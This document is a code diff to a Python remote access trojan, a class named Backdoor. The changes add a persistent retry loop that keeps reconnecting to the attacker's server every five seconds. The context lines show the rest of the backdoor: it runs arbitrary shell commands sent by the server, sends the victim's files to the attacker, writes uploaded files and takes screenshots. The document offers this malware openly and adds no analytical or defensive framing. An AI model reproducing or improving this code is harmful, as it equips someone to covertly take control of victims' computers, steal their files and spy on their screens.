@@ -6,6 +6,7 @@
 # then the results will be sent back
 
 # Built-in Modules
+import time
 from queue import Queue
 import os
 import socket
@@ -19,7 +20,6 @@ from Logger import Logger
 
 
 class Backdoor:
-
     NUMBER_OF_THREADS = 4
     JOB_NUMBER = [1, 2, 3]
     queue = Queue()
@@ -72,14 +72,28 @@ class Backdoor:
     # ****************** THREAD POOL ******************************************************************
 
     def connect_to_server(self, ip, port):
-        # TCP Connection
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+
+        succeeded = False
+        retry_interval = 5
+
+        while succeeded is False:
+
+            try:
+                # TCP Connection
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+                succeeded = True
+                print("Connected!")
+            except Exception as msg:
+                print("An attempt to connect server has failed "+str(msg))
+                print("Will Retry in {} seconds".format(retry_interval))
+                time.sleep(retry_interval)
 
     # Execute given command string in shell
     def execute_system_command(self, command):
         command = " ".join(command)
-        task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                stderr=subprocess.PIPE)
         stdout, stderr = task.communicate()
         output_byte = stdout + stderr
         output_str = output_byte.decode()
@@ -143,6 +157,7 @@ class Backdoor:
                         command_result = self.execute_system_command(command[0])
                 except Exception as e:
                     self.__send_data(e)
+                    continue
 
             # Send files from victim to attacker
             elif command[0] == "download":
@@ -150,6 +165,7 @@ class Backdoor:
                     command_result = self.__read_file(command[1]).decode()
                 except FileNotFoundError:
                     self.__send_data("Cannot find the file specified")
+                    continue
 
             # Write files that attacker sends
             elif command[0] == "upload":
@@ -157,15 +173,18 @@ class Backdoor:
                     command_result = self.__write_file(command[1], command[2])
                 except FileNotFoundError:
                     self.__send_data("Cannot find the file specified")
+                    continue
 
             # Take a screenshot and send it to attacker
             elif command[0] == "screenshot":
                 image = self.logger.get_screenshot()
                 self.__send_data(image)
+                continue
 
             # Check if connection is available
-            elif command[0] == 'AreYouAwake?':
+            elif command == 'AreYouAwake?':
                 self.__send_data(command)
+                continue
 
             # Execute other builtin commands
             else:
